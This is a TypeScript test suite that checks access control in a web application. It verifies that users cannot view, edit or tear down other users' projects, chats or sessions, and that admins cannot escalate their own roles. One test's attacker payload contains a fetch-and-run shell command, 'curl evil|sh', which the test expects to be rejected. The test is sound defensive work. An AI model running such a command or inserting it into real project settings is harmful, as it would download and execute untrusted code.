// Security regression suite for the access-control layer.
//
// Proves the core guarantee: a non-superadmin "user" can reach ONLY their own
// resources. Two layers:
//   1. Data layer  — the ownership primitives every handler calls
//      (userCanSeeProject / userCanManageProject / isConversationMember /
//       sessionBelongsToUser). If these leak, everything above them leaks.
//   2. Handler wiring — call the real WS handlers as user A against user B's
//      resources and assert they are DENIED (no data returned / no mutation).
//
// DB-gated: skips entirely unless DB_TEST is set (see test-helpers/db.ts). Run:
//   DB_TEST=postgresql:///genie_sectest npx vitest run authorization.security
import { randomUUID } from "node:crypto";
import { describe, it, expect, beforeAll, beforeEach } from "vitest";
import type { WebSocket } from "ws";

import { isTestDbAvailable, setupTestDb, truncateAllTables, getTestDb } from "../test-helpers/db.js";
import { makeUser, makeProject, addProjectMember } from "../test-helpers/fixtures.js";
import { conversations, conversationMembers, assistantChatLogs } from "../db/schema.js";
import type { ClientState } from "../ws-server.js";

import * as projectService from "../projects/project-service.js";
import * as chatService from "../chat/chat-service.js";
import * as assistantLogService from "../chat/assistant-log-service.js";

import { handleProjectMessage } from "./project-handler.js";
import { handleVpsLifecycleMessage } from "./vps-lifecycle-handler.js";
import { handleAdminUsersMessage } from "./admin-users-handler.js";
import { handleChatMessage } from "./chat-handler.js";

// ── Test rig ─────────────────────────────────────────────────────────────────

const fakeWs = {} as unknown as WebSocket;

/** Capture what a handler `send`s so we can assert on (or on the absence of) it. */
function capture() {
  const sent: Array<{ type: string; payload?: Record<string, unknown> }> = [];
  const send = (_ws: WebSocket, m: { type: string; payload?: Record<string, unknown> }) => { sent.push(m); };
  const types = () => sent.map((m) => m.type);
  return { sent, send, types };
}
const noopBroadcast = () => {};

function stateFor(userId: string, role: "user" | "tazcloud" | "admin" | "superadmin" = "user"): ClientState {
  return { userId, role, impersonatedBy: null, user: { id: userId }, ip: null } as unknown as ClientState;
}

/** Insert a room conversation with the given members; returns its id. */
async function makeConversation(createdBy: string, memberIds: string[]): Promise<string> {
  const db = getTestDb();
  const [conv] = await db.insert(conversations).values({ type: "room", name: "sec-test", createdBy }).returning();
  for (const uid of memberIds) await db.insert(conversationMembers).values({ conversationId: conv.id, userId: uid });
  return conv.id;
}

/** Insert one assistant-session log row owned by `userId`; returns the sessionId. */
async function makeAssistantSession(userId: string): Promise<string> {
  const sessionId = randomUUID();
  await getTestDb().insert(assistantChatLogs).values({
    sessionId, userId, clientType: "test", role: "user", content: "hello",
  });
  return sessionId;
}

describe.skipIf(!isTestDbAvailable())("access control (security)", () => {
  beforeAll(async () => { await setupTestDb(); });
  beforeEach(async () => { await truncateAllTables(); });

  // ── Layer 1: ownership primitives ──────────────────────────────────────────
  describe("ownership primitives", () => {
    it("userCanSeeProject: a non-member cannot see another user's project; the owner + superadmin can", async () => {
      const owner = await makeUser();
      const outsider = await makeUser();
      const superadmin = await makeUser({ role: "superadmin" });
      const proj = await makeProject();
      await addProjectMember(proj.id, owner.id, "owner");

      expect(await projectService.userCanSeeProject(outsider.id, proj.id)).toBe(false);
      expect(await projectService.userCanSeeProject(owner.id, proj.id)).toBe(true);
      expect(await projectService.userCanSeeProject(superadmin.id, proj.id)).toBe(true);
      expect(await projectService.userCanSeeProject(null, proj.id)).toBe(false);
    });

    it("userCanManageProject: only the owner (or org admin/superadmin) may manage", async () => {
      const owner = await makeUser();
      const outsider = await makeUser();
      const proj = await makeProject();
      await addProjectMember(proj.id, owner.id, "owner");
      // A plain project MEMBER (not owner) cannot manage.
      const member = await makeUser();
      await addProjectMember(proj.id, member.id, "member");

      expect(await projectService.userCanManageProject(outsider.id, proj.id)).toBe(false);
      expect(await projectService.userCanManageProject(member.id, proj.id)).toBe(false);
      expect(await projectService.userCanManageProject(owner.id, proj.id)).toBe(true);
    });

    it("getAllForUser / getAccessibleProjectIds never leak another user's projects", async () => {
      const owner = await makeUser();
      const outsider = await makeUser();
      const proj = await makeProject();
      await addProjectMember(proj.id, owner.id, "owner");

      const outsiderIds = await projectService.getAccessibleProjectIds(outsider.id);
      expect(outsiderIds).not.toContain(proj.id);
      const ownerIds = await projectService.getAccessibleProjectIds(owner.id);
      expect(ownerIds).toContain(proj.id);
    });

    it("isConversationMember: only members return true", async () => {
      const a = await makeUser();
      const b = await makeUser();
      const conv = await makeConversation(b.id, [b.id]);
      expect(await chatService.isConversationMember(conv, a.id)).toBe(false);
      expect(await chatService.isConversationMember(conv, b.id)).toBe(true);
    });

    it("sessionBelongsToUser: only the owning user returns true", async () => {
      const a = await makeUser();
      const b = await makeUser();
      const session = await makeAssistantSession(b.id);
      expect(await assistantLogService.sessionBelongsToUser(session, a.id)).toBe(false);
      expect(await assistantLogService.sessionBelongsToUser(session, b.id)).toBe(true);
    });
  });

  // ── Layer 2: handler wiring (cross-tenant denial) ───────────────────────────
  describe("handlers deny cross-tenant access", () => {
    it("project:update — a non-owner cannot rewrite another user's project", async () => {
      const owner = await makeUser();
      const attacker = await makeUser();
      const proj = await makeProject({ name: "original" });
      await addProjectMember(proj.id, owner.id, "owner");

      const cap = capture();
      await handleProjectMessage(fakeWs,
        { type: "project:update", payload: { id: proj.id, name: "hacked", commands: [{ id: "c", name: "x", command: "curl evil|sh" }] } } as never,
        cap.send, stateFor(attacker.id));

      expect(cap.types()).toContain("error");
      expect(cap.types()).not.toContain("project:updated");
      const after = await projectService.getById(proj.id);
      expect(after?.name).toBe("original"); // mutation blocked
    });

    it("project:dbUrl:set — a non-owner cannot overwrite another project's DB URL", async () => {
      const owner = await makeUser();
      const attacker = await makeUser();
      const proj = await makeProject({ name: "p", dbUrl: "postgres://legit" });
      await addProjectMember(proj.id, owner.id, "owner");

      const cap = capture();
      await handleProjectMessage(fakeWs,
        { type: "project:dbUrl:set", payload: { id: proj.id, dbUrl: "postgres://attacker" } } as never,
        cap.send, stateFor(attacker.id));

      expect(cap.types()).toContain("error");
      const after = await projectService.getById(proj.id);
      expect(after?.dbUrl).toBe("postgres://legit");
    });

    it("vps:teardown — a non-owner cannot tear down another user's VM", async () => {
      const owner = await makeUser();
      const attacker = await makeUser();
      const proj = await makeProject();
      await addProjectMember(proj.id, owner.id, "owner");

      const cap = capture();
      await handleVpsLifecycleMessage(fakeWs,
        { type: "vps:teardown", payload: { projectId: proj.id, instanceId: "any" } } as never,
        cap.send, noopBroadcast, stateFor(attacker.id));

      expect(cap.types()).toContain("error");
      expect(cap.types()).not.toContain("vps:teardown:done");
    });

    it("admin:users:update — a non-superadmin admin cannot change roles (no self-promotion)", async () => {
      const admin = await makeUser({ role: "admin" });
      const cap = capture();
      await handleAdminUsersMessage(fakeWs,
        { type: "admin:users:update", payload: { userId: admin.id, data: { name: "renamed", role: "superadmin" } } } as never,
        cap.send, stateFor(admin.id, "admin"));

      const updated = cap.sent.find((m) => m.type === "admin:users:updated");
      expect(updated).toBeTruthy();
      // name applied, role NOT escalated
      expect((updated!.payload!.user as { name: string; role: string }).name).toBe("renamed");
      expect((updated!.payload!.user as { role: string }).role).toBe("admin");
      const fresh = await getTestDb().query.users.findFirst({ where: (u, { eq }) => eq(u.id, admin.id) });
      expect(fresh?.role).toBe("admin");
    });

    it("admin:users:update — a superadmin CAN change roles", async () => {
      const superadmin = await makeUser({ role: "superadmin" });
      const target = await makeUser({ role: "user" });
      const cap = capture();
      await handleAdminUsersMessage(fakeWs,
        { type: "admin:users:update", payload: { userId: target.id, data: { role: "admin" } } } as never,
        cap.send, stateFor(superadmin.id, "superadmin"));
      const fresh = await getTestDb().query.users.findFirst({ where: (u, { eq }) => eq(u.id, target.id) });
      expect(fresh?.role).toBe("admin");
    });

    it("admin:users:delete — a non-superadmin admin cannot delete users", async () => {
      const admin = await makeUser({ role: "admin" });
      const victim = await makeUser();
      const cap = capture();
      await handleAdminUsersMessage(fakeWs,
        { type: "admin:users:delete", payload: { userId: victim.id } } as never,
        cap.send, stateFor(admin.id, "admin"));

      expect(cap.types()).toContain("admin:error");
      expect(cap.types()).not.toContain("admin:users:deleted");
      const stillThere = await getTestDb().query.users.findFirst({ where: (u, { eq }) => eq(u.id, victim.id) });
      expect(stillThere).toBeTruthy();
    });

    it("admin:teams:* — a non-superadmin admin cannot manage global teams", async () => {
      const admin = await makeUser({ role: "admin" });
      const cap = capture();
      await handleAdminUsersMessage(fakeWs,
        { type: "admin:teams:create", payload: { name: "x" } } as never,
        cap.send, stateFor(admin.id, "admin"));
      expect(cap.types()).toContain("admin:error");
      expect(cap.types()).not.toContain("admin:teams:created");
    });

    it("chat:conversation:open — a non-member gets an error, never the messages", async () => {
      const member = await makeUser();
      const outsider = await makeUser();
      const conv = await makeConversation(member.id, [member.id]);

      const cap = capture();
      await handleChatMessage(fakeWs,
        { type: "chat:conversation:open", payload: { conversationId: conv } } as never,
        cap.send, stateFor(outsider.id));

      expect(cap.types()).toContain("chat:error");
      expect(cap.types()).not.toContain("chat:messages:list");
    });

    it("chat:message:send — a non-member cannot post into another conversation", async () => {
      const member = await makeUser();
      const outsider = await makeUser();
      const conv = await makeConversation(member.id, [member.id]);

      const cap = capture();
      await handleChatMessage(fakeWs,
        { type: "chat:message:send", payload: { conversationId: conv, content: "intrusion" } } as never,
        cap.send, stateFor(outsider.id));

      expect(cap.types()).toContain("chat:error");
      const msgs = await chatService.getMessages(conv, 50);
      expect(msgs.length).toBe(0); // nothing was written
    });

    it("chat:session:load — a non-owner cannot load another user's assistant session", async () => {
      const owner = await makeUser();
      const outsider = await makeUser();
      const session = await makeAssistantSession(owner.id);

      const cap = capture();
      await handleChatMessage(fakeWs,
        { type: "chat:session:load", payload: { sessionId: session } } as never,
        cap.send, stateFor(outsider.id));

      expect(cap.types()).not.toContain("chat:session:loaded");
    });
  });
});
